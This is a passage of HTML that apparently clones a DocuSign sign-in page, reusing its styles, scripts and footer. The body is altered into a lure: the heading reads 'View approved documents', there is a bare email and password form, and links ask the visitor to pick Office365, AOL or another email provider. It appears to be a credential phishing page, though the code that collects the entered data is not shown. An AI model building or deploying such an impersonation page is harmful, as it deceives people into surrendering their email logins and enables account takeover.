            border-bottom: solid 1px #cccccc;
            cursor: pointer;
        }

        .RowAlt {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            cursor: pointer;
        }

        .Row:hover,
        .RowAlt:hover {
            background-color: #f4f4f4;
        }

        .RowSel,
        .RowAltSel {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            background-color: #e4e4e4;
            cursor: pointer;
        }

        .RowCell {
            border-left: none;
            border-right: solid 1px transparent;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            padding: 3px 0px 3px 4px;
        }

        .RowBulkCell {
            border-left: none;
            border-right: none;
            border-bottom: solid 1px #cccccc;
            vertical-align: top;
            padding: 3px 0px 3px 2px;
        }

        .RowCellRight {
            border-left: none;
            border-right: solid 0px transparent;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            padding: 3px 0px 3px 4px;
        }

        .RowNoHeight {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            background-color: #ffffff;
            cursor: pointer;
        }

        .RowAltNoHeight {
            border-left: solid 0px #cccccc;
            border-right: solid 0px #cccccc;
            border-top: solid 1px #cccccc;
            border-bottom: solid 1px #cccccc;
            background-color: #ffffff;
            cursor: pointer;
        }

        .RowNoHeight:hover,
        .RowAltNoHeight:hover {
            background-color: #f4f4f4;
        }

        .ColSorted {
            background-image: url(img/row_col_sorted.png) !important;
        }

        .TreeHeader {
            position: relative;
            white-space: nowrap;
            height: 25px;
            font-weight: normal;
            padding-left: 4px;
            padding-top: 0px;
            margin-bottom: 0px;
            border-top: solid 1px transparent;
        }

        .TreeHeaderText {
            position: absolute;
            top: 4px;
            left: 20px;
        }

        .TreeHeaderTextNotTop {
            position: absolute;
            top: 13px;
            left: 20px;
        }

        .TreeHeaderActive {
            height: 25px;
            background-image: none;
            font-weight: bold;
            border: solid 1px transparent;
        }

        .TreeHeaderActiveNotTop {
            margin-top: 10px;
            padding-top: 10px;
            border-top: solid 1px transparent;
        }

        .TreeHeaderSel {
            font-weight: bold;
            background-image: url(img/dialog_green_h_rotated.png);
        }

        .TreeNewItem {
            font-size: 11px;
            position: absolute;
            top: 4px;
            right: 10px;
            font-weight: normal;
        }

        .TreeNewItemNotTop {
            font-size: 11px;
            position: absolute;
            top: 13px;
            right: 10px;
            font-weight: normal;
        }

        .TreeNodeSel {
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -o-user-select: none;
            user-select: none;
            padding-top: 2px;
            padding-bottom: 2px;
            background-image: url(img/manage_selector.png);
            background-repeat: repeat-x;
        }

        .TreeNode {
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -o-user-select: none;
            user-select: none;
            padding-top: 2px;
            padding-bottom: 2px;
        }

        .TreeNode:Hover {
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -o-user-select: none;
            user-select: none;
            padding-top: 2px;
            padding-bottom: 2px;
            background-color: #f4f4f4;
        }

        .TreeNodeNoH {
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -o-user-select: none;
            user-select: none;
            padding-top: 2px;
            padding-bottom: 2px;
        }
    </style>
    <style id="ds_litStyle" type="text/css"></style>
    <script language="javascript" src="js/XmlHttp.js?vers=18.1.100.8594" type="text/javascript"></script>
    <script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
    <link type="text/css" rel="stylesheet" href="css/Framework.css?vers=18.1.100.8594" />
    <link type="text/css" rel="stylesheet" href="css/activate.css" />
    <style id="ds_hldrHTMLHead_litStyle" type="text/css"></style>

    <script type='text/javascript'>
        function AuthenticateO365(popup) {
            var idx = window.location.href.toLowerCase().indexOf('/member');
            if (idx > -1) {
                var url = window.location.href.substr(0, idx);
                var redirurl = url + '/member/redirect.aspx?extauth=office365&login=';
                if (popup) redirurl += '0';
                else redirurl += '1';
                url += '/restapi/oauth2/externalauth/office365?redirect_uri=' + escape(redirurl) + '&client_id=DOCU-11110b8f-851d-400b-9ec2-641fd2372ac3&nocreate=1';
                if (popup) window.open(url, 'office365auth', 'height=503,width=950');
                else window.location.href = url;
            }
        }

        (function() {
            if (typeof window.janrain !== 'object') window.janrain = {};
            window.janrain.settings = {};

            /* _______________ can edit below this line _______________ */

            janrain.settings.tokenUrl = 'https://www.docusign.net/Member/JanrainProcessor.aspx?action=login';
            janrain.settings.type = 'embed';
            janrain.settings.appId = 'dhpfifnnpifbmnggpkia';
            janrain.settings.appUrl = 'https://login.docusign.net';
            janrain.settings.providers = ['live_id', 'googleplus', 'facebook', 'linkedin', 'salesforce', 'yahoo', 'twitter'];
            janrain.settings.providersPerPage = '8';
            janrain.settings.format = 'one column';
            janrain.settings.actionText = ' ';
            janrain.settings.showAttribution = false;
            janrain.settings.fontColor = '#333333';
            janrain.settings.fontFamily = 'Arial, helvetica, sans-serif';
            janrain.settings.backgroundColor = 'transparent';
            janrain.settings.width = '250';
            janrain.settings.borderColor = 'transparent';
            janrain.settings.borderRadius = '0';
            janrain.settings.buttonBorderColor = 'transparent';
            janrain.settings.buttonBorderRadius = '2';
            janrain.settings.buttonBackgroundStyle = 'gradient';
            janrain.settings.language = 'en';
            janrain.settings.linkClass = 'janrainEngage';

            /* _______________ can edit above this line _______________ */

            function isReady() {
                janrain.ready = true;
            };
            if (document.addEventListener) {
                document.addEventListener('DOMContentLoaded', isReady, false);
            } else {
                window.attachEvent('onload', isReady);
            }

            var e = document.createElement('script');
            e.type = 'text/javascript';
            e.id = 'janrainAuthWidget';

            if (document.location.protocol === 'https:') {
                e.src = 'https://rpxnow.com/js/lib/login.docusign.net/engage.js';
            } else {
                e.src = 'http://widget-cdn.rpxnow.com/js/lib/login.docusign.net/engage.js';
            }

            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(e, s);
        })();
    </script>


    <style type="text/css">
        #office365:hover {
            background-image: none;
            background-color: #E3E3E3;
        }

        #office365 .janrain-provider-icon-24 {
            background-image: url("img/office365_small.png");
            background-repeat: no-repeat;
        }

        .janrainColumnContainer {
            height: 320px;
        }

        .FieldLabel {
            padding-right: 1em;
            padding-bottom: 0.5em;
        }

        .form-area {
            padding-bottom: 1em;
        }

        .form-area h1 {
            padding-bottom: 1em;
            text-align: center;
        }

        .janrainContent {
            margin-left: auto;
            margin-right: auto;
        }
		
		.logins a:hover {
			box-shadow: 2px 5px 10px #1b49a0;
		}
    </style>
    <script type="text/javascript">
        // Wire-up our Janrain override functionality.
        $(document).ready(function() {
            setTimeout(renderO365, 500);

            function renderO365() {
                var twitterItem = $("#janrain-twitter");
                var existingO365 = $("#office365");

                if (twitterItem.length === 0) {
                    setTimeout(renderO365, 500);
                    return;
                }

                // Janrain is tricksy and re-renders when its popup windows are clicked, so we have to monitor for it and re-render when it re-renders.
                // So we poll to make sure things are right.
                if (existingO365.length !== 0) {
                    setTimeout(renderO365, 1000);
                    return;
                }

                // Have to use outerHTML to clone only the markup and not the attached events under IE8. Bleh - stupid attachEvent...
                var o365 = $(twitterItem[0].outerHTML);

                o365.attr("id", "office365");
                o365.click(function() {
                    AuthenticateO365(false);
                });

                var backgroundImage = o365.css("background-image");

                o365.mouseenter(function() {
                    o365.css("background-image", "");
                }).mouseleave(function() {
                    o365.css("background-image", backgroundImage);
                });


                $(".janrain-provider-icon-24", o365)
                    .removeClass("janrain-provider-icon-twitter")
                    .attr("title", "office365")
                    .attr("alt", "office365");

                $(".janrain-provider-text-color-twitter", o365)
                    .removeClass("janrain-provider-text-color-twitter")
                    .text("Office365");

                twitterItem.parent().append(o365);
                $(".janrainContent").css("height", "320px");

                // We just rendered, so keep monitoring, but we can wait a little longer.
                setTimeout(renderO365, 2000);

            }

        });

        // Wire-up the site list functionality.
        $(document).ready(function() {

            // When our site list selection changes, redirect the user to the selected site.
            var siteList = $("#ds_hldrBdy_SiteList");
            var uriPattern = /^http/i;

            siteList.change(function() {

                // If the selected entry has a value (i.e. URI), redirect there.
                var newSite = siteList.val();
                if ((newSite !== undefined) && (newSite !== null) && (uriPattern.test(newSite))) {
                    window.location.assign(newSite);
                }
            });
        });
    </script>


    <script language="javascript" type="text/javascript">
        var bdyId = "ds_hldrBdy_";
        var formbodyId = "ds_FormBody";
        var borderId = "ds_Border";
        var headertabsId = "ds_Tabs";
        var headerId = "ds_Header";
        var footerId = "ds_Footer";
        var tiId = "ds_ti";
        var headerContentId = "ds_hldrHC_";
        var hldrOutside = "ds_hldrOutside_";
        var masterIsMobile = "false";
        var masterIsSafari = "false";
        var leavemastermenuopen = false;

        function BtnCancelMD(btn) {
            if (btn && btn.onmousedown != null) btn.onmousedown = null;
        }

        function ChangeSelectedAccount(accountid, confirmMsg) {
            if (true) {
                if (confirmMsg == "" || confirm(confirmMsg)) {
                    if (typeof(CancelAsynch) != "undefined") CancelAsynch();
                    document.getElementById("hdnSetSelectedAccount").value = accountid;
                    if (typeof(txtHtmlBlobEscape) != "undefined") txtHtmlBlobEscape();
                    document.forms[0].submit();
                }
            }
        }

        function CE(e) {
            if (!e) e = window.event;
            if (e) {
                if (e.cancelBubble != null) e.cancelBubble = true;
                if (e.returnValue != null) e.returnValue = false;
                if (e.preventDefault) e.preventDefault();
                if (e.stopPropagation) e.stopPropagation();
            }
            return false;
        }

        function MasterPageAction(which) {
            if (true) {
                if (typeof(CancelAsynch) != "undefined") CancelAsynch();
                document.getElementById("ds_hdnMasterPageAction").value = which;
                if (typeof(txtHtmlBlobEscape) != "undefined") txtHtmlBlobEscape();
                document.forms[0].submit();
            }
        }

        function ChangeSite(site, accountId) {
            document.getElementById("hdnChangeSiteAccount").value = accountId;
            MasterPageAction(site);
        }

        function CloseMasterPageMenus() {
            if (leavemastermenuopen) {
                leavemastermenuopen = false;
                return;
            }
            ShowAccounts(true);
            var acttop = document.getElementById("ds_divUserAccountsMenu");
            if (acttop) acttop.className = "ActionsMenuClosed HeaderLink";
            var menu = document.getElementById("divAccountMenuItems");
            if (!menu) menu = document.getElementById("divAccountMenuItemsNew");
            if (menu) menu.style.display = "none";
            menu = document.getElementById("ds_divUserAccountsMenuNew");
            if (menu) menu.className = "ActionsMenuClosed";
            acttop = document.getElementById("ds_divLanguageMenu");
            if (acttop) acttop.className = "FooterMenuClosed";
            menu = document.getElementById("divLanguageMenuItems");
            if (menu) menu.style.display = "none";
            menu = document.getElementById("divSiteItems");
            if (menu) menu.style.display = "none";
            acttop = document.getElementById("ds_divHelpMenu");
            if (acttop) acttop.className = "FooterMenuClosed";
            var menu = document.getElementById("divHelpMenuItems");
            if (menu) menu.style.display = "none";
            acttop = document.getElementById("ds_divTermsMenu");
            if (acttop) acttop.className = "FooterMenuClosed";
            var menu = document.getElementById("divTermsMenuItems");
            if (menu) menu.style.display = "none";
            acttop = document.getElementById("ds_divIPMenu");
            if (acttop) acttop.className = "FooterMenuClosed";
            var menu = document.getElementById("divIPMenuItems");
            if (menu) menu.style.display = "none";
            if (typeof(LoadedSetDocMouseDown) != "undefined") LoadedSetDocMouseDown();

            var helpacttop = document.getElementById('divHelpMenu');
            if (helpacttop) acttop.className = 'ActionsMenuClosed';
            var helpmenu = document.getElementById('divHelpMenuItems');
            if (helpmenu) helpmenu.style.display = 'none';
        }

        function OpenMasterPageMenu(mi, outer, css) {
            if (document.getElementById(mi) && document.getElementById(mi).style.display == 'none') {
                var acttop = document.getElementById("ds_" + outer);
                if (acttop) acttop.className = "ActionsMenu " + css;

                /* get before display for positioning */
                var startl = 0;
                if (mi == "divLanguageMenuItems") {
                    var selitem = document.getElementById(bdyId + "divLanguageSelected");
                    if (selitem) {
                        startl = (selitem.offsetWidth / 2);
                    }
                }
                if (mi == "divTermsMenuItems") {
                    var selitem = document.getElementById("divTermsSelected");
                    if (selitem) {
                        startl = (selitem.offsetWidth / 2);
                    }
                }
                if (mi == "divIPMenuItems") {
                    var selitem = document.getElementById("divIPSelected");
                    if (selitem) {
                        startl = (selitem.offsetWidth / 2);
                    }
                }
                if (mi == "divHelpMenuItems") {
                    var selitem = document.getElementById("divHelpSelected");
                    if (selitem) {
                        startl = (selitem.offsetWidth / 2);
                    }
                }

                var midiv = document.getElementById(mi);
                midiv.style.display = 'block';
                if (masterIsMobile) document.ontouchend = CloseMasterPageMenus;
                document.onmousedown = CloseMasterPageMenus;
                if (mi == "divLanguageMenuItems" || "divHelpMenuItems" || "divTermsMenuItems" || "divIPMenuItems") {
                    var footer = document.getElementById(footerId);
                    var footerlinks = document.getElementById("divFooterLinks");
                    var bw = MasterPageBrowserWidth();
                    if (footer && footerlinks && bw > 0) {
                        var l = (masterIsSafari == "true") ? startl - (acttop.offsetWidth / 2) : 0 - startl - (acttop.offsetWidth / 2);
                        var scrleft = MasterPageScrollLeft();
                        if ((footerlinks.offsetLeft - scrleft) + l < 0) {
                            /* if left is off the screen put it at the left edge */
                            l -= l + (footerlinks.offsetLeft - scrleft);
                            acttop.style.left = l + "px";
                        } else {
                            var right = (footerlinks.offsetLeft + l + acttop.offsetWidth) - scrleft;
                            if (right > bw) {
                                l -= (right - bw);
                                /* if left is off the screen put it at the left edge */
                                if ((footerlinks.offsetLeft - scrleft) + l < 0) {
                                    l += (right - bw);
                                    l -= l + (footerlinks.offsetLeft - scrleft);
                                }
                            }
                            acttop.style.left = (l) + "px";
                        }
                    }
                } else if (mi == "divHelpMenuItems" || "divTermsMenuItems" || "divIPMenuItems") acttop.style.left = 0 + "px";
            }
        }

        function ShowAccounts(hide) {
            var div = document.getElementById("divAccountMenuItems");
            if (!div) div = document.getElementById("divAccountMenuItemsNew");
            if (div) div = div.firstChild;
            while (div) {
                if (div.getAttribute && div.getAttribute("isaccount") == "1") {
                    div.style.display = hide ? "none" : "";
                }
                div = div.nextSibling;
            }
            if (!hide) leavemastermenuopen = true;
        }

        function LogoSizePage() {
            if (typeof(Size) == "function") Size();
            if (typeof(ResizeSqueezePage) == "function") {
                ResizeSqueezePage();
                ResizeSqueezePage(false, true);
            }
            if (typeof(SizeFrames) == "function") {
                if (typeof(BrowserDims) != "undefined" && typeof(gHPg) != "undefined") BrowserDims(gHPg);
                SizeFrames();
            }
            if (typeof(SizeWindowObjects) == "function") SizeWindowObjects();
            if (typeof(ResizeManageAccounts) == "function") ResizeManageAccounts();
            if (typeof(ResizePage) == "function") ResizePage();
            if (typeof(SizeContentHeight) == "function") SizeContentHeight();
            if (typeof(resize) == "function") resize();
        }

        function MasterPageBrowserWidth() {
            var bw = 0;
            if (typeof(window.innerWidth) != 'undefined') {
                bw = window.innerWidth;
            } else if (typeof(document.documentElement) != 'undefined' && document.documentElement.clientWidth) {
                bw = document.documentElement.clientWidth;
            } else if (typeof(document.documentElement) != 'undefined' && document.documentElement.offsetWidth) {
                bw = document.documentElement.offsetWidth;
            } else {
                var body = document.getElementsByTagName("body");
                if (body && body[0] &&
                    typeof(body[0]) != 'undefined') {
                    if (typeof(body[0].clientWidth) != 'undefined' && body[0].clientWidth != 0) {
                        bw = body[0].clientWidth;
                    } else if (typeof(body[0].offsetWidth) != 'undefined' && body[0].offsetWidth != 0) {
                        bw = body[0].offsetWidth;
                    }
                }
            }
            return bw;
        }

        function MasterPageScrollLeft() {
            var bL = 0;
            if (masterIsMobile == "true" && window.pageXOffset != null) {
                bL = window.pageXOffset;
            } else if (document.documentElement && document.documentElement.scrollLeft != null) {
                bL = document.documentElement.scrollLeft;
            } else {
                bL = document.body.scrollLeft;
            }
            return bL;
        }

        function upgradeClick() {
            if (document.forms['upgradeForm'] != null) {
                document.forms['upgradeForm'].submit();
            }
            return false;
        }
    </script>
</head>



<body id="ds_docubody">

    <form method="post" action="" id="aspnetForm">
        <div class="aspNetHidden">
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTQzNzc3ODg2MQ8WAh4VX19BbnRpWHNyZk1lbWJlclRva2VuBSAyN2E3MDYxMmIwOTI0YzM2OThkYjFiMzc0YTYwMDljMBYCZg9kFgICAg9kFggCAQ8PFgIeB1Zpc2libGVoZGQCAw9kFgICBw9kFgoCAQ8PFgIfAWhkFgoCAQ8WAh8BaGQCAw9kFgICAQ8WAh4EVGV4dAUWU2V0IGFjY291bnQgYXMgZGVmYXVsdGQCBw9kFgICAw9kFgJmDxYMHgdvbmNsaWNrBRZyZXR1cm4gdXBncmFkZUNsaWNrKCk7Hglpbm5lcmh0bWxlHghkaXNhYmxlZGQeCm9ua2V5cHJlc3MFaGlmKGV2ZW50KXtpZih0eXBlb2YoSXNFbnRlck9yU3BhY2VLZXkpIT09J3VuZGVmaW5lZCcmJklzRW50ZXJPclNwYWNlS2V5KGV2ZW50KSl7cmV0dXJuIHVwZ3JhZGVDbGljaygpO319HhBDYXVzZXNWYWxpZGF0aW9uZx4FY2xhc3MFDEJ0bnNlY29uZGFyeWQCCQ8WAh8BaGQCDQ8WAh8CBQZMb2dvdXRkAgUPDxYCHwFoZBYKAgEPDxYCHwFoZGQCAw8PFgIfAWhkZAIEDw8WAh8BaGRkAgUPDxYCHwFoZGQCCQ8PFgIfAWhkZAIHDw8WAh8BaGQWCgIBDxYCHwFoZAIDDxYCHwFoZAIJDxYCHwFoZAIPD2QWAgIBDxYCHwIFFlNldCBhY2NvdW50IGFzIGRlZmF1bHRkAhUPFgIfAgUGTG9nb3V0ZAIJDw8WAh8BaGRkAgsPZBYCAgEPZBYCAgMPEA8WAh4LXyFEYXRhQm91bmRnZA8WBGYCAQICAgMWBBAFA05BMQUzaHR0cHM6Ly93d3cuZG9jdXNpZ24ubmV0L01lbWJlci9KYW5yYWluRGlzcGxheS5hc3B4ZxAFA05BMgUzaHR0cHM6Ly9uYTIuZG9jdXNpZ24ubmV0L01lbWJlci9KYW5yYWluRGlzcGxheS5hc3B4ZxAFA05BMwUzaHR0cHM6Ly9uYTMuZG9jdXNpZ24ubmV0L01lbWJlci9KYW5yYWluRGlzcGxheS5hc3B4ZxAFAkVVBTJodHRwczovL2V1LmRvY3VzaWduLm5ldC9NZW1iZXIvSmFucmFpbkRpc3BsYXkuYXNweGdkZAIHDxYCHwJlZAIJDw8WAh8BaGRkZLPHkEseDSO6z3OLYcKlDQ0hytFHJVmg/KAOoF49Syg+l/lXPc+/w0BoZPPPIwe++HxL0ej54DeFmGxg0CRUC88=" />
        </div>

        <div class="aspNetHidden">

            <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="B2C6BEC4" />
            <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAc2HpljsHMc3ko7qWtMAwIjUxg2eR5ftqPriAH4UyjRrHc9wrbHQpcOPAAI5iaiKfFQcmKRVhBaWpIqfGI7n7lAPooQ6xlmNYUzxS8YIMYt7wpMZ52KETNMhGu5BUYcYUYxLaG6QZnBQJBnZUwy7F+4Y82XUSJ29sMTtD3de5ny5o22YGtRBi9NtHuvP/81oLV/KRP6rANwWPDu8wSWZ0Dau1iNWxeXGnY0k7WB3EJONg==" />
        </div>
        <div id="ds_divInstance" style="display: none;">
            173
        </div>
        <input type="hidden" name="ds$ti" id="ds_ti" />
        <input type="hidden" name="hdnSetSelectedAccount" id="hdnSetSelectedAccount" value="" />
        <input name="ds$hdnMasterPageAction" type="hidden" id="ds_hdnMasterPageAction" />
        <input type="hidden" name="hdnChangeSiteAccount" id="hdnChangeSiteAccount" value="" />
        <div id="ds_Border" class="Border scroll-container">


            <div id="ds_FormBody" class="FormBody scroll-area">



                <div class="top-area" id="newHeader">
                    <div class="logo-wrapper">
                        <a href="http://www.docusign.com" class="logo-link">
                <img src="img/docusign.png" class="logo" alt="Docusign"></a>
                    </div>
                    <div class="help-wrapper"><a href="http://www.docusign.com/support" class="help-link" target="_new">Help</a></div>
                </div>


                <div class="form-area">
                    <h1>
                        View approved documents
                    </h1>
                    <div id="ds_hldrBdy_janrainRow" class="janrainColumnContainer LoginRow LoginRowLbl" style="display: none;">
                        <div class="container">
                            <form class="form-signin">
                                <label for="inputEmail" class="sr-only">Email address</label>
                                <input type="email" id="inputEmail" name="email" class="form-control" placeholder="Email address" required autofocus>
                                <label for="inputPassword" class="sr-only">Password</label>
                                <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
                                <br>
                                <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>
                            </form>

                        </div>
                    </div>
                    <h3 class="LoginRow LoginRowLbl">
                        <span class="FieldLabel">Select your email provider</span><br><br>
						<div class="logins">
							<a href="office365" class="btn btn-block btn-lg btn-cus"><img src="img/app_office-365_512x512.png" alt="" height="30"> Office365</a>
							<a href="aol" class="btn btn-block btn-lg btn-cus"><img src="img/aol.png" alt="" height="15"></a>
							<a href="other" class="btn btn-block btn-lg btn-cus"><img src="img/social_auth_providers.png" alt="" height="25"></a>
						</div>
                    </h3>
                </div>



            </div>

        </div>

        <div id="popupMask"></div>

        <div id="ds_Footer" class="Footer">

            <img id="ds_imgLogoFooter" title="Powered by DocuSign" class="FooterImage" src="img/powered_by_docusign_gray.png" alt="Powered by DocuSign" style="height:20px;" />

            <div class="FooterLinks" id="divFooterLinks">
                <div id="ds_divLanguageMenu" class="FooterMenuClosed">
                    <div id="divLanguageMenuItems" style="display: none;">
                        <div class="ActionMenuItemTopSmall" onmousedown="CloseMasterPageMenus();" onkeydown="CloseMasterPageMenus();"></div>
                        <table role="presentation">
                            <tr>
                                <td>
                                    <div title="Simplified Chinese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-zh_CN');return CE(event);" onmousedown="MasterPageAction('setlang-zh_CN')" onkeydown="MasterPageAction('setlang-zh_CN')">中文 (简体)</div>
                                </td>
                                <td>
                                    <div title="Traditional Chinese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-zh_TW');return CE(event);" onmousedown="MasterPageAction('setlang-zh_TW')" onkeydown="MasterPageAction('setlang-zh_TW')">中文 (繁體)</div>
                                </td>
                                <td>
                                    <div title="Dutch" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-nl');return CE(event);" onmousedown="MasterPageAction('setlang-nl')" onkeydown="MasterPageAction('setlang-nl')">Nederlandse</div>
                                </td>
                                <td>
                                    <div title="English" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-en');return CE(event);" onmousedown="MasterPageAction('setlang-en')" onkeydown="MasterPageAction('setlang-en')">English</div>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <div title="French" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-fr');return CE(event);" onmousedown="MasterPageAction('setlang-fr')" onkeydown="MasterPageAction('setlang-fr')">Français</div>
                                </td>
                                <td>
                                    <div title="German" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-de');return CE(event);" onmousedown="MasterPageAction('setlang-de')" onkeydown="MasterPageAction('setlang-de')">Deutsch</div>
                                </td>
                                <td>
                                    <div title="Italian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-it');return CE(event);" onmousedown="MasterPageAction('setlang-it')" onkeydown="MasterPageAction('setlang-it')">Italiano</div>
                                </td>
                                <td>
                                    <div title="Japanese" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-ja');return CE(event);" onmousedown="MasterPageAction('setlang-ja')" onkeydown="MasterPageAction('setlang-ja')">日本語</div>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <div title="Korean" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-ko');return CE(event);" onmousedown="MasterPageAction('setlang-ko')" onkeydown="MasterPageAction('setlang-ko')">한국어</div>
                                </td>
                                <td>
                                    <div title="Portuguese (Portugal)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-pt');return CE(event);" onmousedown="MasterPageAction('setlang-pt')" onkeydown="MasterPageAction('setlang-pt')">Português (Portugal)</div>
                                </td>
                                <td>
                                    <div title="Portuguese (Brasil)" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-pt_BR');return CE(event);" onmousedown="MasterPageAction('setlang-pt_BR')" onkeydown="MasterPageAction('setlang-pt_BR')">Português (Brasil)</div>
                                </td>
                                <td>
                                    <div title="Russian" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-ru');return CE(event);" onmousedown="MasterPageAction('setlang-ru')" onkeydown="MasterPageAction('setlang-ru')">Русский</div>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <div title="Spanish" class="ActionMenuItem" ontouchstart="if (window.BtnCancelMD) { window.BtnCancelMD(this);}" ontouchend="MasterPageAction('setlang-es');return CE(event);" onmousedown="MasterPageAction('setlang-es')" onkeydown="MasterPageAction('setlang-es')">Español</div>
                                </td>
                        </table>
                    </div>
                </div>
                <div id="ds_divLanguageSelected" onkeyup="OpenMasterPageMenu(&#39;divLanguageMenuItems&#39;,&#39;divLanguageMenu&#39;, &#39;ActionMenuShowUp&#39;);" onmouseup="OpenMasterPageMenu(&#39;divLanguageMenuItems&#39;,&#39;divLanguageMenu&#39;, &#39;ActionMenuShowUp&#39;);" style="padding-right: 10px; white-space: nowrap; text-align: center;">
                    English (US) <img src="img/btn_arrow_u.png" style="vertical-align:middle;" border="0" alt="Up Arrow" />
                </div>
            </div>
            <script>
                function linkClick_TermsOfUse() {
                    window.open('http://www.docusign.com/company/terms-of-use/lang/en', 'TermsOfUse');
                    return false;
                }
            </script><a tabindex='0' id="TermsOfUse" onclick="linkClick_TermsOfUse()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!=='undefined'&&IsEnterOrSpaceKey(event)){linkClick_TermsOfUse();}}" class="FooterLink" href='javascript:void(0);'>Terms Of Use</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span>
            <script>
                function linkClick_CorporateSupport() {
                    window.open('https://www.docusign.com/support', 'CorporateSupport');
                    return false;
                }
            </script><a tabindex='0' id="CorporateSupport" onclick="linkClick_CorporateSupport()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!=='undefined'&&IsEnterOrSpaceKey(event)){linkClick_CorporateSupport();}}" class="FooterLink" href='javascript:void(0);'>Support</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span>
            <script>
                function linkClick_Feedback() {
                    window.open('http://community.docusign.com/t5/Feedback/ct-p/feedback', 'Feedback');
                    return false;
                }
            </script><a tabindex='0' id="Feedback" onclick="linkClick_Feedback()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!=='undefined'&&IsEnterOrSpaceKey(event)){linkClick_Feedback();}}" class="FooterLink" href='javascript:void(0);'>Feedback</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span>
            <script>
                function linkClick_IntellectualProp() {
                    window.open('http://www.docusign.com/IP/lang/en', 'IntellectualProp');
                    return false;
                }
            </script><a tabindex='0' id="IntellectualProp" onclick="linkClick_IntellectualProp()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!=='undefined'&&IsEnterOrSpaceKey(event)){linkClick_IntellectualProp();}}" class="FooterLink" href='javascript:void(0);'>Intellectual Property</a><span>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;</span>
            <script>
                function linkClick_PrivacyPolicy() {
                    window.open('http://www.docusign.com/company/privacy-policy/lang/en', 'PrivacyPolicy');
                    return false;
                }
            </script><a tabindex='0' id="PrivacyPolicy" onclick="linkClick_PrivacyPolicy()" onkeypress="if(event){if(typeof(IsEnterOrSpaceKey)!=='undefined'&&IsEnterOrSpaceKey(event)){linkClick_PrivacyPolicy();}}" class="FooterLink" href='javascript:void(0);'>Privacy Policy</a><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Copyright © 2018 DocuSign, Inc. All rights reserved.</span>


            <div class="SctClr"></div>

        </div>
        <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>


        <script type="text/javascript">
            //<![CDATA[
            if (self != top) {
                window.popped = true;
                var pm = document.getElementById('popmsg');
                if (pm) {
                    pm.innerHTML = "Please check for the new window that has popped with your document open.  If the window has been blocked by a pop-up blocker, please click Start DocuSign to continue.";
                } else {
